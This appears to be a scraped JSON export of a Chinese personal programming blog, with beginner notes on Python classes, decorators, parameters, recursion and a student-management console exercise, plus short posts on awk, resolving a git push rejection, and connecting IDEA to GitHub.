(std[&apos;name&apos;], std[&apos;score&apos;]))如果采用面向对象的程序设计思想，我们首选思考的不是程序的执行流程，而是Student这种数据类型应该被视为一个对象，这个对象拥有name和score这两个属性（Property）。如果要打印一个学生的成绩，首先必须创建出这个学生对应的对象，然后，给对象发一个print_score消息，让对象自己把自己的数据打印出来。 class Student(object): def __init__(self,name,score): self.name = name self.score = score def print_score(self): print(&apos;%s: %s&apos; %(self.name,self.score))给对象发消息实际上就是调用对象对应的关联函数，我们称之为对象的方法（Method）。面向对象的程序写出来就像这样： bart = Student(&apos;Bart Simpson&apos;,59) bart.print_score()面向对象的设计思想是从自然界中来的，因为在自然界中，类（Class）和实例（Instance）的概念是很自然的。Class是一种抽象概念，比如我们定义的Class——Student，是指学生这个概念，而实例（Instance）则是一个个具体的Student，比如，Bart Simpson和Lisa Simpson是两个具体的Student。 类和实例在 Python 中，定义类是通过 class 关键字： class Student(object): passclass后面紧接着是类名，即Student，类名通常是大写开头的单词，紧接着是(object)，表示该类是从哪个类继承下来的，通常，如果没有合适的继承类，就使用object类，这是所有类最终都会继承的类。 class Student(object): def __init__(self, name, score): self.name = name self.score = score init方法的第一个参数永远是self，表示创建的实例本身，因此，在init方法内部，就可以把各种属性绑定到self，因为self就指向创建的实例本身。 有了init方法，在创建实例的时候，就不能传入空的参数了，必须传入与init方法匹配的参数，但self不需要传，Python解释器自己会把实例变量传进去： 和普通的函数相比，在类中定义的函数只有一点不同，就是第一个参数永远是实例变量self，并且，调用时，不用传递该参数。除此之外，类的方法和普通函数没有什么区别，所以，你仍然可以用默认参数、可变参数、关键字参数和命名关键字参数。 数据封装面向对象的数据封装是指我们只需要调用其类的方法，而不需要知道其具体的内部实现。 class Student(object): def __init__(self,name,score): self.name = name self.score = score def print_score(self): print(&apos;%s: %s&apos; %(self.name,self.score)) def get_grade(self): if self.score &gt;= 90: return &apos;A&apos; elif self.score &gt;=60: return &apos;B&apos; else: return &apos;C&apos; bart = Student(&apos;Bart Simpson&apos;,59) print(bart.get_grade())访问限制如果要让内部属性不被外部访问，可以把属性的名称前加上两个下划线，在Python中，实例的变量名如果以开头，就变成了一个私有变量（private），只有内部可以访问，外部不能访问，所以，我们把Student类改一改： def __init__(self,name,score): self.__name = name self.__score = score def print_score(self): print(&apos;%s: %s&apos; %(self.name,self.score))改完后，对于外部代码来说，没什么变动，但是已经无法从外部访问实例变量.name和实例变量.score了，如果需要访问需要增加2个方法 class Student(object): def __init__(self,name,score): self.__name = name self.__score = score def get_name(self): return self.__name def get_score(self): return self.__score def print_score(self): print(&apos;%s: %s&apos; %(self.name,self.score)) def get_grade(self): if self.score &gt;= 90: return &apos;A&apos; elif self.score &gt;=60: return &apos;B&apos; else: return &apos;C&apos; bart = Student(&apos;Bart Simpson&apos;,59) print(bart.get_name())如果要允许修改 score 呢 class Student(object): def __init__(self,name,score): self.__name = name self.__score = score def get_name(self): return self.__name def get_score(self): return self.__score def print_score(self): print(&apos;%s: %s&apos; %(self.name,self.score)) def set_score(self,score): self.__score = score def get_grade(self): if self.score &gt;= 90: return &apos;A&apos; elif self.score &gt;=60: return &apos;B&apos; else: return &apos;C&apos; bart = Student(&apos;Bart Simpson&apos;,59) print(bart.get_name()) bart.set_score(60) print(bart.get_score()) 则输出 你也许会问，原先那种直接通过bart.score = 99也可以修改啊，为什么要定义一个方法大费周折？因为在方法中，可以对参数做检查，避免传入无效的参数： class Student(object): …… def set_score(self,score): if 0&lt;=score&lt;=100: self.__score = score else: raise ValueError(&apos;bad score&apos;) bart = Student(&apos;Bart Simpson&apos;,59) print(bart.get_name()) bart.set_score(101) print(bart.get_score()) 需要注意的是，在Python中，变量名类似xxx的，也就是以双下划线开头，并且以双下划线结尾的，是特殊变量，特殊变量是可以直接访问的，不是private变量，所以，不能用name、score这样的变量名。 有些时候，你会看到以一个下划线开头的实例变量名，比如_name，这样的实例变量外部是可以访问的，但是，按照约定俗成的规定，当你看到这样的变量时，意思就是，“虽然我可以被访问，但是，请把我视为私有变量，不要随意访问”。 双下划线开头的实例变量是不是一定不能从外部访问呢？其实也不是。不能直接访问name是因为Python解释器对外把name变量改成了_Student__name，所以，仍然可以通过_Student__name来访问__name变量： &gt;&gt;&gt; bart._Student__name &apos;Bart Simpson&apos;","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"awk 将多行文件转为一行","slug":"awk-将多行文件转为一行","date":"2018-04-16T04:17:30.000Z","updated":"2021-02-26T06:05:29.269Z","comments":true,"path":"posts/59328.html","link":"","permalink":"https://awen.me/posts/59328.html","excerpt":"现在有这么一个文件，可以看到输出了该 yml 文件中的md 文件后缀的内容","text":"现在有这么一个文件，可以看到输出了该 yml 文件中的md 文件后缀的内容 ➜ netease-techs cat mkdocs.yml| awk -F &apos;:&apos; &apos;{print $2}&apos; | grep moduls| awk -F &apos;/&apos; &apos;{print $2}&apos; nvm.md cdn.md rds.md nos.md nce.md redis.md elk.md memcached.md kafka.md rabbitmq.md haproxy.md disk.md vpc.md nas.md domain.md mongodb.md acservices.md logserivces.md amservices.md alarm.md然后我希望将这很多行转为一行输出 ➜ netease-techs cat mkdocs.yml| awk -F &apos;:&apos; &apos;{print $2}&apos; | grep moduls| awk -F &apos;/&apos; &apos;{print $2}&apos; | awk BEGIN{RS=EOF}&apos;{gsub(/\\n/,&quot; &quot;);print}&apos; nvm.md cdn.md rds.md nos.md nce.md redis.md elk.md memcached.md kafka.md rabbitmq.md haproxy.md disk.md vpc.md nas.md domain.md mongodb.md acservices.md logserivces.md amservices.md alarm.md 说明：awk默认将记录分隔符（record separator即RS）设置为\\n，此行代码将RS设置为EOF（文件结束），也就是把文件视为一个记录，然后通过gsub函数将\\n替换成空格，最后输出。 另外利用 xargs 也许是最方便的了 ➜ netease-techs cat mkdocs.yml| awk -F &apos;:&apos; &apos;{print $2}&apos; | grep moduls| awk -F &apos;/&apos; &apos;{print $2}&apos; | xargs nvm.md cdn.md rds.md nos.md nce.md redis.md elk.md memcached.md kafka.md rabbitmq.md haproxy.md disk.md vpc.md nas.md domain.md mongodb.md acservices.md logserivces.md amservices.md alarm.md创建文件 ➜ netease-techs cat mkdocs.yml| awk -F &apos;:&apos; &apos;{print $2}&apos; | grep moduls| awk -F &apos;/&apos; &apos;{print $2}&apos; | xargs touch ➜ netease-techs ls acservices.md cdn.md domain.md kafka.md mkdocs.yml nce.md rabbitmq.md vpc.md alarm.md disk.md elk.md logserivces.md mongodb.md nos.md rds.md amservices.md docs haproxy.md memcached.md nas.md nvm.md redis.md ➜ netease-techs","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"python 的偏函数","slug":"python-的偏函数","date":"2018-04-16T01:30:27.000Z","updated":"2021-02-26T06:05:29.285Z","comments":true,"path":"posts/60997.html","link":"","permalink":"https://awen.me/posts/60997.html","excerpt":"Python的functools模块提供了很多有用的功能，其中一个就是偏函数（Partial function）。要注意，这里的偏函数和数学意义上的偏函数不一样。","text":"Python的functools模块提供了很多有用的功能，其中一个就是偏函数（Partial function）。要注意，这里的偏函数和数学意义上的偏函数不一样。 int()函数可以把字符串转换为整数，当仅传入字符串时，int()函数默认按十进制转换： &gt;&gt;&gt; int(&apos;12345&apos;) 12345#转八进制. &gt;&gt;&gt; int(&apos;12345&apos;,base=8) 5349#转16进制. &gt;&gt;&gt; int(&apos;12345&apos;,16) 74565#将二进制转为十进制，base 默认是10. def int2(x,base=2): return int(x,base) print(int2(&apos;1010&apos;))","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"关于 hexo 代码高亮和行号问题","slug":"关于-hexo-代码高亮和行号问题","date":"2018-04-15T03:40:09.000Z","updated":"2021-02-26T06:05:29.313Z","comments":true,"path":"posts/60212.html","link":"","permalink":"https://awen.me/posts/60212.html","excerpt":"之前在文章中加入代码我都是使用 tab，很奇怪的是为什么不显示行号，都是如图所示的样子","text":"之前在文章中加入代码我都是使用 tab，很奇怪的是为什么不显示行号，都是如图所示的样子 今天发现原来要想代码高亮和显示行号是不可直接 tab 的 必须```code``` 包住代码才行 例如 1234567891011121314def log(func): def wrapper(*args,**kw): print('call %s():' % func.__name__) return func(*args,**kw) return wrapper@logdef now(): print('2015-01-01')now()","categories":[],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://awen.me/tags/hexo/"}]},{"title":"Python 的装饰器","slug":"Python-的装饰器","date":"2018-04-15T00:04:12.000Z","updated":"2021-02-26T06:05:29.263Z","comments":true,"path":"posts/5556.html","link":"","permalink":"https://awen.me/posts/5556.html","excerpt":"什么是装饰器在函数调用前后自动打印日志，但又不希望修改函数的定义，这种在代码运行期间动态增加功能的方式，称之为“装饰器”（Decorator）。","text":"什么是装饰器在函数调用前后自动打印日志，但又不希望修改函数的定义，这种在代码运行期间动态增加功能的方式，称之为“装饰器”（Decorator）。 本质上，decorator就是一个返回函数的高阶函数。所以，我们要定义一个能打印日志的decorator，例如: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162 def log(func): def wrapper(*args,**kw): print('call %s():' % func.__name__) return func(*args,**kw) return wrapper @log def now(): print('2015-01-01') now()``` 输出结果```python call now(): 2015-01-01 ``` 把@log放到now()函数的定义处，相当于执行了语句：```python now = log(now)``` 如果decorator本身需要传入参数，那就需要编写一个返回decorator的高阶函数，写出来会更复杂。比如，要自定义log的文本：```python def log(text): def decorator(func): def wrapper(*args,**kw): print('%s %s():' % (text,func.__name__)) return func(*args,**kw) return wrapper return decorator @log('execute') def now(): print('2015-01-01') now() ``` 和两层嵌套的decorator相比，3层嵌套的效果是这样的：```python &gt;&gt;&gt; now = log('execute')(now)``` 首先执行log('execute')，返回的是decorator函数，再调用返回的函数，参数是now函数，返回值最终是wrapper函数。以上两种decorator的定义都没有问题，但还差最后一步。因为我们讲了函数也是对象，它有__name__等属性，但你去看经过decorator装饰之后的函数，它们的__name__已经从原来的'now'变成了'wrapper'：```python print(now.__name__) 输出 1wrapper 因为返回的那个wrapper()函数名字就是’wrapper’，所以，需要把原始函数的name等属性复制到wrapper()函数中，否则，有些依赖函数签名的代码执行就会出错。 不需要编写wrapper.name = func.name这样的代码，Python内置的functools.wraps就是干这个事的，所以，一个完整的decorator的写法如下： 123456789101112131415161718192021222324252627282930313233343536373839 import functools def log(func): @functools.wraps(func) def wrapper(*args, **kw): print('call %s():' % func.__name__) return func(*args, **kw) return wrapper @log def now(): print('2015-01-01') now() ``` 或者针对带参数的decorator：```python import functools def log(text): def decorator(func): @functools.wraps(func) def wrapper(*args, **kw): print('%s %s():' % (text,func.__name__)) return func(*args, **kw) return wrapper return decorator @log('tt') def now(): print('2015-01-01') now() 输出 12tt now():2015-01-01","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"Python 列表生成","slug":"Python-列表生成","date":"2018-04-14T12:50:46.000Z","updated":"2021-02-26T06:05:29.262Z","comments":true,"path":"posts/22294.html","link":"","permalink":"https://awen.me/posts/22294.html","excerpt":"生成器列表生成式即List Comprehensions，是Python内置的非常简单却强大的可以用来创建list的生成式。 L = [] for x in range(1,11): L.append(x * x) print(L)","text":"生成器列表生成式即List Comprehensions，是Python内置的非常简单却强大的可以用来创建list的生成式。 L = [] for x in range(1,11): L.append(x * x) print(L) 得出 [1, 4, 9, 16, 25, 36, 49, 64, 81, 100]但是我们可以更简化些 T = [x*x for x in range(1,11)] print(T)同样的效果 此外还可以进行判断 1234567891011 L = [x*x for x in range(1,11) if x%2 ==0] print(L)``` 输出结果```python [4, 16, 36, 64, 100] 例如还可以使用两层循环，可以生成全排列： 1234567891011 L = [m + n for m in 'ABC' for n in 'XYZ'] print(L) ``` 得到```python ['AX', 'AY', 'AZ', 'BX', 'BY', 'BZ', 'CX', 'CY', 'CZ'] 迭代器判断对象是否可用被迭代 12345678910111213 from collections import Iterable print(isinstance('abc',Iterable)) // 返回布尔型 ``` 输出下标```python for i,value in enumerate(['A','B','C']): print(i,value) 得到 1230 A1 B2 C","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"Python 递归函数和匿名函数","slug":"Python-递归函数","date":"2018-04-14T12:06:01.000Z","updated":"2021-02-26T06:05:29.263Z","comments":true,"path":"posts/14664.html","link":"","permalink":"https://awen.me/posts/14664.html","excerpt":"在函数内部，可以调用其他函数。如果一个函数在内部调用自身本身，这个函数就是递归函数。","text":"在函数内部，可以调用其他函数。如果一个函数在内部调用自身本身，这个函数就是递归函数。 12345678 def fact(x): if x ==1: return 1 return x * fact(x-1)print(fact(3)) //输出6 = 2*2*2 使用递归函数需要防范栈溢出，在计算机中，函数调用是通过栈（stack）这种数据结构实现的，每当进入一个函数调用，栈就会加一层栈帧，每当函数返回，栈就会减一层栈帧。由于栈的大小不是无限的，所以，递归调用的次数过多，会导致栈溢出。 12345678910111213141516171819202122232425262728 def fact(x): if x ==1: return 1 return x * fact(x-1) print(fact(1000))``` 报错```python /Users/wenjun/PycharmProjects/python2018/venv/bin/python /Users/wenjun/PycharmProjects/python2018/day01/defdemo.py Traceback (most recent call last): File \"/Users/wenjun/PycharmProjects/python2018/day01/defdemo.py\", line 80, in &lt;module&gt; print(fact(1000)) File \"/Users/wenjun/PycharmProjects/python2018/day01/defdemo.py\", line 77, in fact return x * fact(x-1) File \"/Users/wenjun/PycharmProjects/python2018/day01/defdemo.py\", line 77, in fact return x * fact(x-1) File \"/Users/wenjun/PycharmProjects/python2018/day01/defdemo.py\", line 77, in fact return x * fact(x-1) [Previous line repeated 994 more times] File \"/Users/wenjun/PycharmProjects/python2018/day01/defdemo.py\", line 75, in fact if x ==1: RecursionError: maximum recursion depth exceeded in comparison 解决递归调用栈溢出的方法是通过尾递归优化，事实上尾递归和循环的效果是一样的，所以，把循环看成是一种特殊的尾递归函数也是可以的。 尾递归是指，在函数返回的时候，调用自身本身，并且，return语句不能包含表达式。这样，编译器或者解释器就可以把尾递归做优化，使递归本身无论调用多少次，都只占用一个栈帧，不会出现栈溢出的情况。 123456789101112def fact(n): return fact_iter(n,1)def fact_iter(num,product): if num == 1: return product return fact_iter(num-1,num*product)print(fact_iter(2,120)) 匿名函数当我们在传入函数时，有些时候，不需要显式地定义函数，直接传入匿名函数更方便。 12print(list(map(lambda x:x*x,[1,2,3,4,5,6,7,8,9]))) 输出 12[1, 4, 9, 16, 25, 36, 49, 64, 81] 通过对比可以看出，匿名函数lambda x: x * x实际上就是： 1234567891011121314 def f(x): return x * x ``` 关键字lambda表示匿名函数，冒号前面的x表示函数参数。匿名函数有个限制，就是只能有一个表达式，不用写return，返回值就是该表达式的结果。```python &gt;&gt;&gt; f = lambda x: x*x &gt;&gt;&gt; f &lt;function &lt;lambda&gt; at 0x101bcbe18&gt; &gt;&gt;&gt; f(5) 25","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"浅析 Python 的参数","slug":"浅析-Python-的不可变参数","date":"2018-04-14T03:20:44.000Z","updated":"2021-02-26T06:05:29.345Z","comments":true,"path":"posts/58194.html","link":"","permalink":"https://awen.me/posts/58194.html","excerpt":"Python的函数定义非常简单，但灵活度却非常大。除了正常定义的必选参数外，还可以使用默认参数、可变参数和关键字参数，使得函数定义出来的接口，不但能处理复杂的参数，还可以简化调用者的代码。","text":"Python的函数定义非常简单，但灵活度却非常大。除了正常定义的必选参数外，还可以使用默认参数、可变参数和关键字参数，使得函数定义出来的接口，不但能处理复杂的参数，还可以简化调用者的代码。 位置参数例如: 12345678910111213 def power(x): return x * x ``` 对于power(x)函数，参数x就是一个位置参数。当我们调用power函数时，必须传入有且仅有的一个参数x：```python &gt;&gt;&gt; power(5) 25 &gt;&gt;&gt; power(15) 225 默认参数123456def power(x, n=2): s = 1 while n &gt; 0: n = n - 1 s = s * x return s 可以在定义函数时，默认给上一个参数 n=2 使用默认参数能够最大的好处是能降低调用函数的难度。 默认参数很有用，但使用不当，也会掉坑里。默认参数有个最大的坑，演示如下： 12345678910def add_end(L=[]): L.append(\"END\") return Lprint(add_end([1,2,3]))print(add_end(['x','y','z']))print(add_end())print(add_end())print(add_end()) 会输出 12345[1, 2, 3, 'END']['x', 'y', 'z', 'END']['END']['END', 'END']['END', 'END', 'END'] 我们可以看到，第一次和第二次输出都没有问题，因为我们传了参数进去，第三次我们输入，会返回默认的 ‘END’，但是第四次和第五次就有问题了。 原因解释如下： Python函数在定义的时候，默认参数L的值就被计算出来了，即[]，因为默认参数L也是一个变量，它指向对象[]，每次调用该函数，如果改变了L的内容，则下次调用时，默认参数的内容就变了，不再是函数定义时的[]了。 我们要修改下该函数 12345def add_end(L=None): if L is None: L =[] L.append(\"END\") return L 定义默认参数要牢记一点：默认参数必须指向不变对象！ 为什么要设计str、None这样的不变对象呢？因为不变对象一旦创建，对象内部的数据就不能修改，这样就减少了由于修改数据导致的错误。此外，由于对象不变，多任务环境下同时读取对象不需要加锁，同时读一点问题都没有。我们在编写程序时，如果可以设计一个不变对象，那就尽量设计成不变对象。 可变参数在Python函数中，还可以定义可变参数。顾名思义，可变参数就是传入的参数个数是可变的，可以是1个、2个到任意个，还可以是0个。 要定义出这个函数，我们必须确定输入的参数。由于参数个数不确定，我们首先想到可以把a，b，c……作为一个list或tuple传进来，这样，函数可以定义如下： 12345def calc(num): sum = 0 for n in num: sum = sum +n * n return sum 但是调用的时候，需要先组装出一个list或tuple： 123print(calc([1,2,3]))print(calc([1,3,5,7])) 改为可变参数. 12345678def calc(*num): sum = 0 for n in num: sum = sum +n * n return sumprint(calc(1,2,3)) 定义可变参数和定义一个list或tuple参数相比，仅仅在参数前面加了一个*号。在函数内部，参数numbers接收到的是一个tuple，因此，函数代码完全不变。但是，调用该函数时，可以传入任意个参数，包括0个参数 那如果要传入一个 list 或 tuple 呢 123456789def calc(*num): sum = 0 for n in num: sum = sum +n * n return sumnums = [1,2,3]print(calc(*nums)) *nums表示把nums这个list的所有元素作为可变参数传进去。这种写法相当有用，而且很常见。 关键字参数123456789101112131415161718192021222324252627282930313233343536373839404142 def person(name,age,**kw): print('name:',name,'age:',age,'other:',kw) person('Michael',30) person('Michael',30,city='Beijing')``` 输出```python name: Michael age: 30 other: &#123;&#125; name: Michael age: 30 other: &#123;'city': 'Beijing'&#125; ``` 关键字参数有什么用？它可以扩展函数的功能。比如，在person函数里，我们保证能接收到name和age这两个参数，但是，如果调用者愿意提供更多的参数，我们也能收到。试想你正在做一个用户注册的功能，除了用户名和年龄是必填项外，其他都是可选项，利用关键字参数来定义这个函数就能满足注册的需求。传入一个字典```python extra = &#123;'city':'Beijing','Job':'Engineer'&#125; person('zhangsan',30,**extra)``` # 命名关键字参数对于关键字参数，函数的调用者可以传入任意不受限制的关键字参数。至于到底传入了哪些，就需要在函数内部通过kw检查。如需限制传入参数: ```python def person(name,age,*,city,job): print(name,age,city,job) person('zhangsan',30,city='hangzhou',job='Techs') 和关键字参数**kw不同，命名关键字参数需要一个特殊分隔符*，*后面的参数被视为命名关键字参数。 1234567891011121314151617181920212223242526272829303132333435363738 def person(name,age,*,city='beijing',job): print(name,age,city,job) person('zhangsan',30,job='Techs')``` # 参数组合在Python中定义函数，可以用必选参数、默认参数、可变参数、关键字参数和命名关键字参数，这5种参数都可以组合使用。但是请注意，参数定义的顺序必须是：必选参数、默认参数、可变参数、命名关键字参数和关键字参数。```python def f1(a,b,c=0,*args,**kw): print('a=',a,'b=',b,'c=',c,'args=',args,'kw=',kw) def f2(a, b, c=0, *, d, **kw): print('a =', a, 'b =', b, 'c =', c, 'd =', d, 'kw =', kw) print(f1(1,2)) print(f1(1,2,c=3)) print(f1(1,2,3,'a','b')) print(f1(1,2,3,'a','b','c',d=11))``` 输出```python a= 1 b= 2 c= 0 args= () kw= &#123;&#125; None a= 1 b= 2 c= 3 args= () kw= &#123;&#125; None a= 1 b= 2 c= 3 args= ('a', 'b') kw= &#123;&#125; None a= 1 b= 2 c= 3 args= ('a', 'b', 'c') kw= &#123;'d': 11&#125; None 传入tuple 和 dict args = (1,2,3,4,5) kw = {'d':99,'x':44} print(f1(*args,**kw)) *args是可变参数，args接收的是一个tuple； **kw是关键字参数，kw接收的是一个dict。 学习笔记来自廖雪峰的 python","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"python练习之学员管理系统","slug":"python练习之学员管理系统","date":"2018-04-13T13:27:09.000Z","updated":"2021-02-26T06:05:29.289Z","comments":true,"path":"posts/37248.html","link":"","permalink":"https://awen.me/posts/37248.html","excerpt":"实现一个可以增删查的系统，主要是为了巩固 python 基础中的方法、字典、循环、判断等知识 打印菜单效果如下","text":"实现一个可以增删查的系统，主要是为了巩固 python 基础中的方法、字典、循环、判断等知识 打印菜单效果如下 实现方法 1234print(\"=\"*12,\"学员管理系统\",\"=\"*14)print(\"&#123;0:1&#125;&#123;1:13&#125;&#123;2:15&#125;\".format(\" \",\"1.查看学员信息\",\"2.添加学员信息\"))print(\"&#123;0:1&#125;&#123;1:13&#125;&#123;2:15&#125;\".format(\" \",\"3.删除学员信息\",\"4.退出系统\"))print(\"=\"*40) format 函数可以接受不限个参数，位置可以不按顺序。 此外我们定义一个变量来接收输入的值，例如1、2、3、4 key = input(&quot;请输入对应的选择:&quot;)但是，这样每次我们都要重新执行程序，这样非常不方便，因此我们可以设置一个死循环. 12345678while 1: print(\"=\"*12,\"学员管理系统\",\"=\"*14) print(\"&#123;0:1&#125;&#123;1:13&#125;&#123;2:15&#125;\".format(\" \",\"1.查看学员信息\",\"2.添加学员信息\")) print(\"&#123;0:1&#125;&#123;1:13&#125;&#123;2:15&#125;\".format(\" \",\"3.删除学员信息\",\"4.退出系统\")) print(\"=\"*40) key = input(\"请输入对应的选择:\") 这样就可以每次执行完不停止进程而输出菜单了，另外我们要获取输入的值之后要进行判断. 12345678910111213141516if key == \"1\": print(\"=\"*12,\"学员信息浏览\",\"=\"*14) input(\"按任意键继续...\") elif key == \"2\": print(\"=\"*12,\"学员信息添加\",\"=\"*14) input(\"按任意键继续...\")elif key == \"3\": print(\"=\"*12,\"删除学员信息\",\"=\"*14) input(\"按任意键继续...\")elif key == \"4\": print(\"=\" * 12, \"退出系统\", \"=\" * 14) breakelse: print(\"=\"*12,\"无效的键盘输入\",\"=\"*14) 初始化数据定义一个字典，加入一些数据. 12345stulist = [ &#123;'name':'张三','age':20,'classid':'java'&#125;, &#123;'name':'李四','age':25,'classid':'java'&#125;, &#123;'name':'王五','age':15,'classid':'java'&#125;, ] 查看信息查看学员信息要考虑到假如列表没有数据的情况，比如数据被删除完了，这个时候我们需要判断下 stulist 这个字典里还有没有数据，我们定义一个方法做以下事情： 1.判断字典是否为空，如果是空则输出信息2.否则输入列表，这里要按一定的格式输出 1234567891011def showStu(stulist): if len(stulist) ==0: print(\"=\"*12,\"没有学员信息可以输出\",\"=\"*14) return print(\"|&#123;0:&lt;5&#125;|&#123;1:&lt;10&#125;|&#123;2:&lt;5&#125;|&#123;3:10&#125;|\".format(\"sid\",\"name\",\"age\",\"classid\")) print(\"-\"*40) for i in range(len(stulist)): print(\"|&#123;0:&lt;5&#125;|&#123;1:&lt;10&#125;|&#123;2:&lt;5&#125;|&#123;3:10&#125;|\".format(i+1, stulist[i]['name'], stulist[i]['age'], stulist[i]['classid'])) print(\"-\" * 40) 添加信息 如图所示 实现方法，当判断输入的值为2时，我们新建一个字典，然后往该字典添加3个值，并将该字典追加到stulist 中去并输出添加后的字典数据 1234567891011elif key == \"2\": print(\"=\"*12,\"学员信息添加\",\"=\"*14) stu = &#123;&#125; stu['name'] =input(\"请输入你要添加的姓名:\") stu['age'] = input(\"请输入要添加的年龄:\") stu['classid'] = input(\"请输入要添加的班级信息:\") stulist.append(stu) showStu(stulist) input(\"按回车键继续...\") 删除信息 如图所示 实现方法，当输入值=3，获取需要删除的 id，因为是字典，我们需要拿到其下标，但是字典的下标是从0开始的，因此，我们需要-1，而又因为字符串的关系，因此这里我们需要强制转换下 1234567elif key == \"3\": print(\"=\"*12,\"删除学员信息\",\"=\"*14) sid = input(\"请输入你需要删除的 id 号:\") del stulist[int(sid)-1] showStu(stulist) input(\"按回车键继续...\") 退出系统 如图所示 实现方法，退出很好实现，当输入4时我们就跳出死循环就可以了 123elif key == \"4\": print(\"=\" * 12, \"退出系统\", \"=\" * 14) break 完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475# -*- coding:utf-8 -*-# 定义一个用于存放学员信息的列表变量stulist = [ &#123;'name':'张三','age':20,'classid':'java'&#125;, &#123;'name':'李四','age':25,'classid':'java'&#125;, &#123;'name':'王五','age':15,'classid':'java'&#125;,]# 定义一个学员的输出函数def showStu(stulist): if len(stulist) ==0: print(\"=\"*12,\"没有学员信息可以输出\",\"=\"*14) return print(\"|&#123;0:&lt;5&#125;|&#123;1:&lt;10&#125;|&#123;2:&lt;5&#125;|&#123;3:10&#125;|\".format(\"sid\",\"name\",\"age\",\"classid\")) print(\"-\"*40) for i in range(len(stulist)): print(\"|&#123;0:&lt;5&#125;|&#123;1:&lt;10&#125;|&#123;2:&lt;5&#125;|&#123;3:10&#125;|\".format(i+1, stulist[i]['name'], stulist[i]['age'], stulist[i]['classid'])) print(\"-\" * 40)# 输出界面def main(): while 1: print(\"=\"*12,\"学员管理系统\",\"=\"*14) print(\"&#123;0:1&#125;&#123;1:13&#125;&#123;2:15&#125;\".format(\" \",\"1.查看学员信息\",\"2.添加学员信息\")) print(\"&#123;0:1&#125;&#123;1:13&#125;&#123;2:15&#125;\".format(\" \",\"3.删除学员信息\",\"4.退出系统\")) print(\"=\"*40) key = input(\"请输入对应的选择:\") if key == \"1\": print(\"=\"*12,\"学员信息浏览\",\"=\"*14) showStu(stulist) input(\"按回车键继续...\") elif key == \"2\": print(\"=\"*12,\"学员信息添加\",\"=\"*14) stu = &#123;&#125; stu['name'] =input(\"请输入你要添加的姓名:\") stu['age'] = input(\"请输入要添加的年龄:\") stu['classid'] = input(\"请输入要添加的班级信息:\") stulist.append(stu) showStu(stulist) input(\"按回车键继续...\") elif key == \"3\": print(\"=\"*12,\"删除学员信息\",\"=\"*14) sid = input(\"请输入你需要删除的 id 号:\") del stulist[int(sid)-1] showStu(stulist) input(\"按回车键继续...\") elif key == \"4\": print(\"=\" * 12, \"退出系统\", \"=\" * 14) break else: print(\"=\"*12,\"无效的键盘输入\",\"=\"*14)if __name__ == '__main__': main() 拓展那么如何进行如图所示修改操作呢？ 既然是对字典进行操作，步骤应该如下： 1.获取需要修改的字典下标，然后将其替换，怎么替换呢？我们稍微修改下程序，判断输入的为4则修改，先给出当前已有的列表，然后要求用户输入 id，当然这个 id 是需要-1的，并且必须是int 类型，否则会报错，然后我们获取 stulist对应 id 的三个参数去进行输入即可。 1234567elif key == \"4\": showStu(stulist) sid = int(input(\"请输入你需要修改的 id 号:\"))-1 stulist[sid][\"name\"] = input(\"请输入你要修改的姓名:\") stulist[sid][\"age\"] = input(\"请输入你要修改的姓名:\") stulist[sid][\"classid\"] = input(\"请输入你要添加的班级信息:\") showStu(stulist) GitHub code","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"Note about fast-forwards 解决","slug":"Note-about-fast-forwards-解决","date":"2018-04-13T08:44:47.000Z","updated":"2021-02-26T06:05:29.261Z","comments":true,"path":"posts/24790.html","link":"","permalink":"https://awen.me/posts/24790.html","excerpt":"git push 出现错误 git push origin master To github.com:monkey-wenjun/python2018.git ! [rejected] master -&gt; master (fetch first) error: failed to push some refs to &apos;git@github.com:monkey-wenjun/python2018.git&apos; hint: Updates were rejected because the remote contains work that you do hint: not have locally. This is usually caused by another repository pushing hint: to the same ref. You may want to first integrate the remote changes hint: (e.g., &apos;git pull ...&apos;) before pushing again. hint: See the &apos;Note about fast-forwards&apos; in &apos;git push --help&apos; for details.","text":"git push 出现错误 git push origin master To github.com:monkey-wenjun/python2018.git ! [rejected] master -&gt; master (fetch first) error: failed to push some refs to &apos;git@github.com:monkey-wenjun/python2018.git&apos; hint: Updates were rejected because the remote contains work that you do hint: not have locally. This is usually caused by another repository pushing hint: to the same ref. You may want to first integrate the remote changes hint: (e.g., &apos;git pull ...&apos;) before pushing again. hint: See the &apos;Note about fast-forwards&apos; in &apos;git push --help&apos; for details. 这是因为远程仓库和本地文件不一致，合并下即可 git fetch origin warning: no common commits remote: Counting objects: 3, done. remote: Compressing objects: 100% (2/2), done. remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 Unpacking objects: 100% (3/3), done. From github.com:monkey-wenjun/python2018 * [new branch] master -&gt; origin/master如果不行可以强制提交 git push -u origin master -f","categories":[],"tags":[{"name":"git","slug":"git","permalink":"https://awen.me/tags/git/"}]},{"title":"IEDA 连接 GitHub","slug":"IEDA-连接-GitHub","date":"2018-04-13T01:42:29.000Z","updated":"2021-02-26T06:05:29.248Z","comments":true,"path":"posts/20164.html","link":"","permalink":"https://awen.me/posts/20164.html","excerpt":"申请 GitHub token我们使用 token 的方式配置 IDEA","text":"申请 GitHub token我们使用 token 的方式配置 IDEA 1.登录 GitHub，选择 settings，如图所示 2.找到 Developer settings 3.选择 Personal access tokens – 创建 Token 4.选择权限，创建即可 5.复制 token 值 配置 IDEA配置GitHub1.找到选项–版本控制-GitHub，按照如图所示的地方粘贴 token 2.点击 Test 3.切换到 git 如图所示 新建仓库1.GitHub 创建一个仓库，比如叫 LearnJava 2.复制 GitHub 仓库地址 3.选择 VCS—&gt;Import into Version Control—&gt;Create git Repository… 将本地项目转换成一个 Git 仓库 4.在依次点击 VCS-git，选择 Remotes 5.添加远程仓库地址 